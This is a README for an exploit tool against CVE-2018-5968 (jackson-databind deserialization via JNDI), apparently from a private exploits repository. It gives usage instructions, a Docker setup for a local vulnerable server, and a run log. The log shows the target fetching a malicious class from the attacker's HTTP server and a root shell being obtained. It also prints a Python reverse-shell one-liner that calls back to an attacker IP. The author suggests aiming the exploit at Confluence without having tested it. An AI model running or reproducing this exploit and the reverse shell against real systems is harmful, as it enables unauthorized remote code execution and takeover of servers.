# jackson_deser_rce

## Summary

CVE-2018-5968 which can be used to exploit the default typing in jackson-databind.

FasterXML jackson-databind through 2.8.11 and 2.9.x through 2.9.3 allows unauthenticated
remote code execution because of an incomplete fix for the CVE-2017-7525 and CVE-2017-17485
deserialization flaws. This is exploitable via two different gadgets that bypass a blacklist.
One of these gadgets is abuse JNDI as this PoC code demonstrate.

## Note

This exploit CVE-2018-5968 so in theory this should work on Confluence and other applications that used jackson. I have no license or test server to test it on yet,
but you need to find a entry point in confluence where jackson databind is used so serialize the input and you will
have full pty shell with this exploit code.

## Dependencies

You need first build the project with maven to get a jar files that is needed to trigger the vulnerability. 


```ssh
jackson_deser_rce  master ⦿ mvn clean install
```

## Usage

Start docker container with Jackson vuln server if you want to test this locally

```ssh
⬢  jackson_deser_rce  master ⦿ docker-compose build
Building jackson
Step 1/9 : FROM maven:3-jdk-7 AS builder
 ---> 434d4c17a0d8
Step 2/9 : COPY ./ /usr/src/
 ---> Using cache
 ---> 3fb6f12b3612
Step 3/9 : WORKDIR /usr/src
 ---> Using cache
 ---> 6d971ad5094a
Step 4/9 : RUN cd /usr/src;     mvn -U clean package -Dmaven.test.skip=true
 ---> Using cache
 ---> 99491e5b562d
Step 5/9 : FROM vulhub/java:7u21-jdk
 ---> dc7dfbff2b3d
Step 6/9 : RUN apt-get update && apt-get install -y      python
 ---> Using cache
 ---> 2fa1fc665b74
Step 7/9 : COPY --from=builder /usr/src/target/jackson_vuln_server.jar /jackson_vuln_server.jar
 ---> Using cache
 ---> 366d824fc9a3
Step 8/9 : EXPOSE 8080
 ---> Using cache
 ---> ca74498e95ba
Step 9/9 : CMD ["java", "-jar", "/jackson_vuln_server.jar"]
 ---> Using cache
 ---> 7e23db2cb941
Successfully built 7e23db2cb941
Successfully tagged jackson_deser_rce_jackson:latest

⬢  jackson_deser_rce  master ⦿ docker-compose up -d
Starting jackson_deser_rce_jackson_1 ... done
```

Verify that container is running.

```ssh
⬢  jackson_deser_rce  master ⦿ docker ps
CONTAINER ID        IMAGE                       COMMAND                  CREATED             STATUS              PORTS                    NAMES
df085b7d9ee3        jackson_deser_rce_jackson   "java -jar /jackson_…"   26 minutes ago      Up 9 seconds        0.0.0.0:8080->8080/tcp   jackson_deser_rce_jackson_1
```

Run ./jackson_jndi_rce.py to get the usage menu.

```ssh
 ▐▄▄▄ ▄▄▄·  ▄▄· ▄ •▄ .▄▄ ·        ▐ ▄  ▐▄▄▄ ▐ ▄ ·▄▄▄▄  ▪  ▄▄▄   ▄▄· ▄▄▄ .
  ·██▐█ ▀█ ▐█ ▌▪█▌▄▌▪▐█ ▀. ▪     •█▌▐█  ·██•█▌▐███▪ ██ ██ ▀▄ █·▐█ ▌▪▀▄.▀·
▪▄ ██▄█▀▀█ ██ ▄▄▐▀▀▄·▄▀▀▀█▄ ▄█▀▄ ▐█▐▐▌▪▄ ██▐█▐▐▌▐█· ▐█▌▐█·▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐▌▐█▌▐█ ▪▐▌▐███▌▐█.█▌▐█▄▪▐█▐█▌.▐▌██▐█▌▐▌▐█▌██▐█▌██. ██ ▐█▌▐█•█▌▐███▌▐█▄▄▌
 ▀▀▀• ▀  ▀ ·▀▀▀ ·▀  ▀ ▀▀▀▀  ▀█▄▀▪▀▀ █▪ ▀▀▀•▀▀ █▪▀▀▀▀▀• ▀▀▀.▀  ▀·▀▀▀  ▀▀▀
[nighter@nighter.se]

Usage: ./jackson_deser_rce.py <URL> <LHOST> <LPORT>

EXAMPLE: ./jackson_deser_rce.py 'http://127.0.0.1:8080' 10.10.14.24 7777
```        

Run the exploit

```ssh
⬢  jackson_deser_rce  master ⦿ ./jackson_deser_rce.py 'http://127.0.0.1:8080' 192.168.1.81 7777                                                     │docker_api_rce      gocd_rce   jackson_deser_rce  jenkins_sconsole_rce.py  mssql_xpcmdshell_rce  tomcat_war_rce
[+] LHOST = 192.168.1.81                                                                                                                             │docker_privesc_rce  ideas.txt  jboss_deser_rce    jolokia_exploit          README.md             xdebug_rce
[+] LPORT = 7777                                                                                                                                     │⬢  private_exploits  master ⦿ cd jackson_deser_rce
[+] Shell listen                                                                                                                                     │⬢  jackson_deser_rce  master ⦿ ls
Listening on 0.0.0.0:9092                                                                                                                            │docker  docker-compose.yml  jackson_deser_rce.py  poc.json  pom.xml  src  target
Starting HTTP server                                                                                                                                 │⬢  jackson_deser_rce  master ⦿ docker-compose up -d
[+] Exploit                                                                                                                                          │Starting jackson_deser_rce_jackson_1 ... done
Send LDAP reference result for ExportObject redirecting to http://192.168.1.81:7873/ExportObject.class                                               │⬢  jackson_deser_rce  master ⦿ python -c 'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("192.168.1.81", 7
javaCodeBase: http://192.168.1.81:7873/                                                                                                              │777)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()'
new http request from /172.20.0.2:45394 /ExportObject.class                                                                                          │^C%
# id                                                                                                                                                 │ ⬢  jackson_deser_rce  master ⦿
uid=0(root) gid=0(root) groups=0(root)
``
